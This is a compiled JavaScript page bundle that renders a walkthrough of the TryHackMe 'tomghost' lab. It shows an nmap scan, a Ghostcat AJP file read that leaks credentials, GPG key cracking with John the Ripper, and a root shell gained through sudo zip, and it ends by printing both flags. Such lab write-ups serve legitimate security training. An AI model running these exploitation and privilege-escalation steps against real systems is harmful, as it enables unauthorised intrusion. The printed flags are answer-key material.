"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[937],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>d});var r=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var l=r.createContext({}),c=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},p=function(e){var t=c(e.components);return r.createElement(l.Provider,{value:t},e.children)},m="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},h=r.forwardRef((function(e,t){var n=e.components,o=e.mdxType,a=e.originalType,l=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),m=c(n),h=o,d=m["".concat(l,".").concat(h)]||m[h]||u[h]||a;return n?r.createElement(d,s(s({ref:t},p),{},{components:n})):r.createElement(d,s({ref:t},p))}));function d(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var a=n.length,s=new Array(a);s[0]=h;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[m]="string"==typeof e?e:o,s[1]=i;for(var c=2;c<a;c++)s[c]=n[c];return r.createElement.apply(null,s)}return r.createElement.apply(null,n)}h.displayName="MDXCreateElement"},9888:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>s,default:()=>u,frontMatter:()=>a,metadata:()=>i,toc:()=>c});var r=n(87462),o=(n(67294),n(3905));const a={},s="tomghost",i={unversionedId:"Tryhackme/Tomghost/tomghost",id:"Tryhackme/Tomghost/tomghost",title:"tomghost",description:"Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.",source:"@site/writeups/Tryhackme/Tomghost/tomghost.md",sourceDirName:"Tryhackme/Tomghost",slug:"/Tryhackme/Tomghost/",permalink:"/writeups/Tryhackme/Tomghost/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"tmux",permalink:"/writeups/Tryhackme/Tmux/"},next:{title:"Tony the Tiger",permalink:"/writeups/Tryhackme/Tony the Tiger/"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Flags",id:"flags",level:2}],p={toc:c},m="wrapper";function u(e){let{components:t,...n}=e;return(0,o.kt)(m,(0,r.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"tomghost"},"tomghost"),(0,o.kt)("p",null,"Identify recent vulnerabilities to try exploit the system or read files that you should not have access to."),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/tomghost"},"tomghost")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"CVE-2020-1938 - Apache Tomcat"),(0,o.kt)("li",{parentName:"ul"},"Brute Forcing (GPG)"),(0,o.kt)("li",{parentName:"ul"},"Misconfigured Binaries")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"flags"},"Flags"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Are you able to complete the challenge?"),"\nThe machine may a take up to 5 minutes to boot and configure."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/tomghost$ sudo nmap -A -Pn -sC -sV -O 10.10.58.11\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 17:42 CEST\nNmap scan report for 10.10.58.11\nHost is up (0.038s latency).\nNot shown: 996 closed ports\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)\n|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)\n|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)\n53/tcp   open  tcpwrapped\n8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)\n| ajp-methods:\n|_  Supported methods: GET HEAD POST OPTIONS\n8080/tcp open  http       Apache Tomcat 9.0.30\n|_http-favicon: Apache Tomcat\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-title: Apache Tomcat/9.0.30\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/4%OT=22%CT=1%CU=36362%PV=Y%DS=2%DC=T%G=Y%TM=5F79ED7\nOS:1%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=102%TI=Z%CI=I%II=I%TS=8)OPS\nOS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1\nOS:1NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN\nOS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1025/tcp)\nHOP RTT      ADDRESS\n1   37.71 ms 10.8.0.1\n2   37.69 ms 10.10.58.11\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 28.80 seconds\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/tomghost$ python3 ajpShooter.py http://10.10.58.11:8080/ 8009 /WEB-INF/web.xml read\n\n       _    _         __ _                 _\n      /_\\  (_)_ __   / _\\ |__   ___   ___ | |_ ___ _ __\n     //_\\\\ | | \'_ \\  \\ \\| \'_ \\ / _ \\ / _ \\| __/ _ \\ \'__|\n    /  _  \\| | |_) | _\\ \\ | | | (_) | (_) | ||  __/ |\n    \\_/ \\_// | .__/  \\__/_| |_|\\___/ \\___/ \\__\\___|_|\n         |__/|_|\n                                                00theway,just for test\n\n\n[<] 200 200\n[<] Accept-Ranges: bytes\n[<] ETag: W/"1261-1583902632000"\n[<] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT\n[<] Content-Type: application/xml\n[<] Content-Length: 1261\n\n<?xml version="1.0" encoding="UTF-8"?>\n\x3c!--\n Licensed to the Apache Software Foundation (ASF) under one or more\n  contributor license agreements.  See the NOTICE file distributed with\n  this work for additional information regarding copyright ownership.\n  The ASF licenses this file to You under the Apache License, Version 2.0\n  (the "License"); you may not use this file except in compliance with\n  the License.  You may obtain a copy of the License at\n\n      http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an "AS IS" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n  See the License for the specific language governing permissions and\n  limitations under the License.\n--\x3e\n<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"\n  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee\n                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"\n  version="4.0"\n  metadata-complete="true">\n\n  <display-name>Welcome to Tomcat</display-name>\n  <description>\n     Welcome to GhostCat\n        skyfuck:8730281lkjlkjdqlksalks\n  </description>\n\n</web-app>\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/tomghost$ gpg2john tryhackme.asc > tryhackme.hash\n\nFile tryhackme.asc\n\nkali@kali:~/CTFs/tryhackme/tomghost$ john --wordlist=/usr/share/wordlists/rockyou.txt tryhackme.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])\nCost 1 (s2k-count) is 65536 for all loaded hashes\nCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes\nCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes\nWill run 2 OpenMP threads\nPress \'q\' or Ctrl-C to abort, almost any other key for status\nalexandru        (tryhackme)\n1g 0:00:00:00 DONE (2020-10-04 17:55) 7.692g/s 8246p/s 8246c/s 8246C/s chinita..alexandru\nUse the "--show" option to display all of the cracked passwords reliably\nSession completed\n\nkali@kali:~/CTFs/tryhackme/tomghost$ gpg --import tryhackme.asc\ngpg: /home/kali/.gnupg/trustdb.gpg: trustdb created\ngpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported\ngpg: key 8F3DA3DEC6707170: secret key imported\ngpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed\ngpg: Total number processed: 2\ngpg:               imported: 1\ngpg:              unchanged: 1\ngpg:       secret keys read: 1\ngpg:   secret keys imported: 1\n\nkali@kali:~/CTFs/tryhackme/tomghost$ gpg --decrypt credential.pgp\ngpg: WARNING: cipher algorithm CAST5 not found in recipient preferences\ngpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11\n      "tryhackme <stuxnet@tryhackme.com>"\nmerlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j\n')),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"merlin@ubuntu:~$ sudo -l\nMatching Defaults entries for merlin on ubuntu:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser merlin may run the following commands on ubuntu:\n    (root : root) NOPASSWD: /usr/bin/zip\nmerlin@ubuntu:~$ TF=$(mktemp -u)\nmerlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'\n  adding: etc/hosts (deflated 31%)\n# whoami\nroot\n# cd /root\n# cat root.txt\nTHM{Z1P_1S_FAKE}\n#\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Compromise this machine and obtain user.txt")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{GhostCat_1s_so_cr4sy}")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"Escalate privileges and obtain root.txt")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{Z1P_1S_FAKE}")))}u.isMDXComponent=!0}}]);